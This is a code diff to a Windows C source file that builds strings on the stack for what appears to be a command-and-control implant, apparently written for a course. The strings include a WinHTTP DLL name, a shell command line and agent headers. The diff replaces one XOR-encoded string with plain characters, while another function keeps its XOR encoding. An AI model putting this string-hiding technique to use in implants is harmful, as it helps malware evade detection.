@@ -4,8 +4,6 @@
 #include "protocol.h"
 
 #define STRLEN_BYTES_WINHTTP 22
-#define STACKSTR_KEY_HASH 0x4E
-#define STACKSTR_KEY_GETW 0x7A
 
 static inline VOID BuildWinHttpDllName(PWCHAR buf)
 {
@@ -44,7 +42,6 @@ static inline VOID BuildUserAgent(PWCHAR buf)
     *(volatile WCHAR *)&buf[16] = L'0'; // 0
     *(volatile WCHAR *)&buf[17] = L'\0'; // null terminator
 }
-
 
 
 static inline VOID BuildShellCommandLine(PWCHAR buf)
@@ -143,16 +140,15 @@ static inline VOID BuildUrlEnvironmentVariableName(PCHAR buf)
 
 static inline VOID BuildDefaultCommitHash(PCHAR buf)
 {
-    volatile UINT32 key = STACKSTR_KEY_HASH;
-    *(volatile CHAR *)&buf[0] = (0x2Du ^ key);
-    *(volatile CHAR *)&buf[1] = (0x21u ^ key);
-    *(volatile CHAR *)&buf[2] = (0x3Bu ^ key);
-    *(volatile CHAR *)&buf[3] = (0x3Cu ^ key);
-    *(volatile CHAR *)&buf[4] = (0x3Du ^ key);
-    *(volatile CHAR *)&buf[5] = (0x2Bu ^ key);
-    *(volatile CHAR *)&buf[6] = (0x7Eu ^ key);
-    *(volatile CHAR *)&buf[7] = (0x7Fu ^ key);
-    *(volatile CHAR *)&*(volatile WCHAR *)&buf[8] = 0;
+    *(volatile CHAR *)&buf[0] = 'c';
+    *(volatile CHAR *)&buf[1] = 'o';
+    *(volatile CHAR *)&buf[2] = 'u';
+    *(volatile CHAR *)&buf[3] = 'r';
+    *(volatile CHAR *)&buf[4] = 's';
+    *(volatile CHAR *)&buf[5] = 'e';
+    *(volatile CHAR *)&buf[6] = '0';
+    *(volatile CHAR *)&buf[7] = '1';
+    *(volatile CHAR *)&buf[8] = 0;
 }
 
 static inline VOID BuildApiVersionHeader(PCHAR buf)
@@ -177,9 +173,6 @@ static inline VOID BuildApiVersionHeader(PCHAR buf)
     *(volatile CHAR *)&buf[17] = '\n';
     *(volatile CHAR *)&buf[18] = 0;
 }
-
-
-
 static inline VOID BuildAgentNameIdHeader(PCHAR buf)
 {
     *(volatile CHAR *)&buf[0] = 'X';
@@ -384,6 +377,7 @@ static inline VOID BuildCommitHeaderPrefix(PCHAR buf)
     *(volatile CHAR *)&buf[15] = (0x7Bu ^ key);
     *(volatile CHAR *)&*(volatile WCHAR *)&buf[16] = 0;
 }
+
 
 static inline VOID BuildX64ArchitectureHeaders(PCHAR buf)
 {
